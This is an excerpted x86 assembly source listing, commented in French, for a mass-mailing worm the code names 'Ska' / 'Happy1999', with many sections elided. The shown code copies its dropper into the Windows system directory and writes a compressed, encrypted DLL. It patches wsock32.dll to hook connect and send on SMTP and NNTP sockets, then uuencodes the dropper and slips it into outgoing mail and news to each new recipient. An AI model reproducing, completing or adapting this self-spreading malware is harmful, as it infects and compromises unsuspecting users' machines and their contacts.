...
;============================= madll.dll compressΘe et cryptΘe =============================

include madll.inc

;================================== quelques noms cryptΘs ==================================
...
idiff			dd ?
addoffunctions		dd ?
addofnames		dd ?		;ne pas sΘparer ces trois
addofordinals		dd ?
rvaendofcode		dd ?
rvaoriginale_1		dd ?
rvaoriginale_2		dd ?
...
system_dir		dd ?		;writebuffer+28000	;ne pas sΘparer!
...
;----- recupΘrer le directory systΦme 

push 200
push system_dir
call GetSystemDirectoryA		;gΘnΘralement C:\WINDOWS\SYSTEM
test eax, eax
jz stop2
...
push dropper_dir
push 0
call GetModuleFileNameA			;rΘcupΘrer son path actuel
test eax, eax
jz stop2

mov esi, dropper_dir			;si jamais le prog est "Ska"
add esi, eax				;et pas "Happy1999", se souvenir
sub esi, 5				;de ne pas dΘclencher l'effet
...
push 1					;si dΘjα prΘsent, erreur
push system_dir
push dropper_dir
call CopyFileA				;pas de test d'erreur car si on est au boot,
					;cet abruti se copie sur lui-mΩme

;*******************************************************************************************
;***                      CREER MA DLL DANS C:\WINDOWS\SYSTEM                            ***
;*******************************************************************************************

;-------- dΘcompresser et crΘΘr madll.dll dans C:\WINDOWS\SYSTEM
...
push offset NbBytesWritten	;address of number of bytes written (si jamais tout n'est pas Θcrit)
...
;------ crΘΘr le path entier de wsock32
...
;------ si wsock32.dll en cours d'utilisation, le dropper s'ΘxΘcute au prochain boot
...
push eax		;optional security attributes (0=dΘfaut)
...
jz stop
or [ebx+36], 80000000h		;rendre la section code capable d'Ωtre automodifiΘe
...
;---------- se prΘparer α scanner la table des fonctions exportΘes
...
;trouve le point d'entrΘe des fc exportΘes (connect, send) dans l'image mappΘe de Wsock32.dll

mov verif, 0			;pour vΘrifier qu'on a bien trouvΘ les 2 fonctions
cherche_API:
mov ebx, [esi]
sub ebx, diff
...
inc verif				;une fc trouvΘe de plus
pop esi
pop edx
jmp fausse_alerte
...
call endpatch
	...
	;===============> point d'entrΘe de la nouvelle connect <======================
	...
	;----- vΘrifier si c'est une session mail ou news
	...
	stosb				;stocke le no de socket connectΘe au port 25 
					;(dans no_socket_mail)
	...
	mov eax, [esp+32+4+4]		;no de socket
	stosb				;stocke le no de socket connectΘe au port 119 
					;(dans no_socket_news)
	...
	db "Ska.dll",0
	ici_offset_de_ll: 
	mov eax, -1				;!!!transformΘ au moment de l'infection!!!!!
	...
	db 0E9h,0,0,0,0				;!!!transformΘ au moment de l'infection!!!!!

	;================> point d'entrΘe de la nouvelle send <============================
	...
	;----- on vΘrifie le numero de socket

	lodsw					;no_socket_mail = al, no_socket_news = ah
	mov ebx, [esp+32+4+4]			;no de socket de la session actuelle
	cmp ah, bl				;la socket actuelle est liΘe au port 119?
	je send_port_nntp			;oui => on va ds la dll, routine "news"
	cmp al, bl				;la socket actuelle est liΘe au port 25?
	je send_port_smtp			;oui => on va ds la dll, routine "mail"

	jmp retour_a_send			;socket actuelle liΘe α autre port, on revient

	;------ rΘcupΘrer l'offset de ma fonction (GetProcAddress)
	...
	zz_getprocad1:
	lodsd					;rΘcup du handle de ma librairie
	...
	cmp al, 1				;si en retour al=1, on ne dΘcharge pas ma dll
	...
	cmp bl, "N"				;une session news a foirΘ?
	jne autre				;non => teste si c'est du mail
	inc edi					;edi pointe vers no_socket_news
	stosb					;on annule le hook de send_news
	lodsb					;et on regarde si send_mail est toujours hookΘ
	cmp al, 0
	jne retour_a_send			;send_mail est toujours hookΘ => on revient
	inc esi					;esi pointe vers handle_madll
	jmp unload_dll				;send_mail n'est pas hookΘ non plus 
						;=> on dΘcharge ma dll (facon de parler)

	autre:
	cmp bl, "M"				;une session mail a foirΘ?
	...
	lodsb					;on regarde si send_news est toujours hookΘ
	cmp al, 0
	jne retour_a_send			;send_news est toujours hookΘ => on revient

	;------ si oui, on dΘcharge ma librairie
	...
	no_socket_mail:		db 0
	no_socket_news:		db 0		;ne pas sΘparer ces trois enfoirΘs
	handle_madll:		dd 0
...
;------ Θcrire le code dans l'image mappΘe

pop esi
mov ecx, offset endpatch-offset startpatch
rep movsb

;------ Θcrire les bonnes rΘfΘrences aux 3 API du kernel
...
;----- Θcrire les bons sauts de retour
...
call SetPixelV		;quand la fenetre est repeinte, on met le pixel α sa coordonnΘe
...
;----- pour voir si la fenetre est fermΘe
...
;----- procΘdure de fenΩtre vide pour accΘlΘrer
...
;----- procΘdure pour initialiser une explosion
...
offset_mem_buffer2_recipient	dd ?		;mem_buffer2 + 3000	;ne pas sΘparer
...
;------- ProcΘdure de chargement ou de dΘchargement ?
...
;------ Cette routine est appelΘe α chaque chargement de la DLL
...
;------- se rΘserver 5 Ko de mΘmoire pour headers/rcpt si ce n'est pas deja fait
...
;------ Cette routine est appelΘe α chaque dΘchargement de la DLL

dechargement_dll:

push offset_mem_buffer2_headers			;le petit tampon intermΘdiaire
call LocalFree
...
;----localise les donnΘes de la commande send

call recuperer_offset_et_taille_envoi		;nique ebx, ecx, retourne ebx, ecx

;----- voir si ce qui est envoyΘ est une commande au serveur ou le corps d'un message
...
;----- c'est une commande au serveur: rΘcupΘrer des infos
...
;---- si c'est la commande "from", on rΘcupΦre l'envoyeur et sa taille
...
;----analyse les donnΘes de la commande send
...
;---- on vΘrifie que ce destinataire n'a pas dΘjα recu le dropper
...
;======================= tout est OK, on envoit le matΘriel ================================

call recuperer_socket_et_original_send		;nique ebx, eax, renvoie en mΘmoire
...
mov eax, 1				;retour sans dΘchargement de ma dll
ret

fin_routine_mail_avec_dechargement:

mov eax, "MMMM"			;retour avec dΘchargement de ma dll
ret
...
call recuperer_socket_et_original_send	;nique abx, eax, renvoie en mΘmoire
...
mov eax, "NNNN"				;retour avec dΘchargement de ma dll
ret
...
push 0				;addr. of structure needed for overlapped I/O (0 pour normale)
push offset liste_size		;address of nb of bytes written (si jamais tout n'est pas Θcrit)
...
stop_verifie_destinataire:	;s'il y a le moindre probleme, on envoie quand mΩme
popad
...
mov ebx, [esp+32+(5*4)]	;offset du contenu envoyΘ
...
;----- rΘcupΘrer no de socket

mov ebx, [esp+32+(4*4)]	;no de socket
mov no_socket, ebx

;----- rΘcupΘrer le saut au send original

pop eax
pop ebx
push ebx
push eax
add ebx, 34+25		;ATTENTION!! dΘpend du dropper!!!!!!!!!!!!!
...
;------- rΘcupΘrer le path/nom du dropper

push 100
push offset_mem_buffer2_system_dir
call GetSystemDirectoryA		;gΘnΘralement C:\WINDOWS
test eax, eax
...
push offset sizeofmappedfile	;address of high-order word for file size (si ca dΘpasse)
...
push 0			;optional security attributes (0=dΘfaut)
...
;------ uucoder le dropper depuis son mapping (binaire) jusqu'α la zone mΘmoire rΘservΘe

mov esi, offset debut
mov edi, offset_mem_buffer
mov ecx, size_debut
rep movsb				;transfΘrer "begin xxxx.exe"
...
mov esi, offset fin
mov ecx, size_fin
rep movsb				;transfΘrer "end"

mov ecx, edi
sub ecx, offset_mem_buffer
mov size_uu_file, ecx			;se souvenir de la taille du fichier uucodΘ
...
;------- tout fermer: fichiers (dropper, dropper uucodΘ) et mΘmoire (mapping*2, buffer)
